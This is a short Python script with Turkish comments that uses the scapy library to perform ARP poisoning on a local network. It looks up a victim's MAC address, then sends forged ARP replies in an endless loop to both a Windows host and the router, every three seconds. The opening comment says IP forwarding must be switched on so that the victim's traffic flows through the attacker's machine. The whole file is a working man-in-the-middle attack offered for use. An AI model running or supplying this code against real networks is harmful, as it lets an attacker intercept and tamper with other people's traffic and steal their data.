# bu attack öncesi ip_forward açmak lazım. Yoksa client paketleri makinamız iletemez.
import scapy.all as scapy
import time
#girdiğimiz ip nin macini veren method
def get_mac_address(ip):
    apr_request_package = scapy.ARP(pdst=ip)
    broadcas_package = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    combined_package = broadcas_package/apr_request_package
    answered_list = scapy.srp(combined_package,timeout=1,verbose=False)[0]
    #print(answered_list[0][0].hwsrc)
    return answered_list[0][0].hwsrc


def arp_poisoning(target_ip, modem_ip):
    target_mac = get_mac_address(target_ip)
    #pdst hedef, hwdst kendi mac adresimiz psrc modemin ipsi
    arp_response = scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=modem_ip)
    scapy.send(arp_response,verbose=False)

#get_mac_address("192.168.1.42")
while True:
    arp_poisoning("192.168.1.42","192.168.1.1") # bu windowsu spooflıycak(kandırma)
    arp_poisoning("192.168.1.1","192.168.1.42") # buda modemi spooflayacak
    time.sleep(3) # 3 saniye bekle
